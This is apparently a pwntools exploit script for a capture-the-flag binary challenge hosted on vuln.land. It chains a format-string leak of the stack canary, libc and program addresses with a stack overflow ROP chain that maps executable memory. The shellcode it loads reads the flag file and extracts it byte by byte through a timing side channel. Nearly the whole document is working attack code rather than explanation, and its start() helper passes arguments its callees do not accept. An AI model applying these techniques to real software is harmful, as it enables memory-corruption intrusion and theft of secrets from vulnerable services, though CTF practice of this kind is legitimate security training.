#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'

host = args.HOST or '<INSTANCE>.rdocker.vuln.land'
port = int(args.PORT or 1337)


def start_local():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript, env={"LD_PRELOAD": "./libc.so.6"})
    else:
        return process([exe.path], env={"LD_PRELOAD": "./libc.so.6"})


def start_remote():
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


gdbscript = '''
tbreak main
'''.format(**locals())

exe = context.binary = ELF('./pwn' if args.LOCAL else './public/pwn')
libc = ELF('./libc.so.6')

known = "HV23{"
while True:
    offset = len(known)
    for current in "#0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}$!":
        # reset the base addresses
        exe.address = 0
        libc.address = 0
        try:
            io = start()

            io.recvuntil(b'for?')
            io.sendline(b"%43$p %45$p %47$p")
            io.recvuntil(b"of ")
            leaks = io.recvline().decode().split(' ')

            cookie_leak = int(leaks[0], 16)
            libc_leak = int(leaks[1], 16)
            main_leak = int(leaks[2][:-1], 16)

            exe.address = main_leak - exe.sym['main']
            libc.address = libc_leak - 0x29d90

            for i in range(4):
                io.recvuntil(b'wish: ')
                io.sendline(b'a')

            io.recvuntil(b'wish: ')

            rop = ROP(libc)
            bss = exe.bss(20)
            shell = 0x10000

            rop.raw(rop.find_gadget(['pop rdi', 'ret']))
            rop.raw(bss)

            # sets r9 = 0
            rop.raw(libc.address + 0x0000000000054d69)

            rop.raw(rop.find_gadget(['pop rdi', 'ret']))
            rop.raw(shell)

            rop.raw(rop.find_gadget(['pop rsi', 'ret']))
            rop.raw(300)

            rop.raw(rop.find_gadget(['pop rcx', 'ret']))
            rop.raw(34)

            rop.raw(rop.find_gadget(['pop rdx', 'ret']))
            rop.raw(7)

            rop.raw(libc.sym['mmap'])

            rop.read(0, shell, 100)  # read shellcode from stdin
            rop.raw(shell)

            io.sendline(fit({264: cookie_leak, 280: rop.chain()}))
            file_name = exe.address + 0x000020ea
            data_segment = exe.bss(20)

            sc = asm(f"""
                mov rdi, {hex(file_name)}
                xor rsi, rsi
                xor rdx, rdx
                mov rax, 2
                syscall
                
                mov rdi, rax
                mov rsi, {hex(data_segment)}
                mov rdx, 0x30
                xor rax, rax
                syscall
                
                mov rsi, {hex(data_segment)}
                add rsi, {offset}
                xor rax, rax
                mov al, {hex(ord(current))}
                mov bl, [rsi]
                cmp al, bl
                
                je L2
                jmp done
                L2:
                nop
                jmp L2
                done:
                nop""")
            io.sendline(sc)

            before = time.time()
            io.recvall(timeout=5)

            if time.time() - before > 5:
                known += current
                print(known)
                break
            io.close()

        except Exception as e:
            print(current, e)
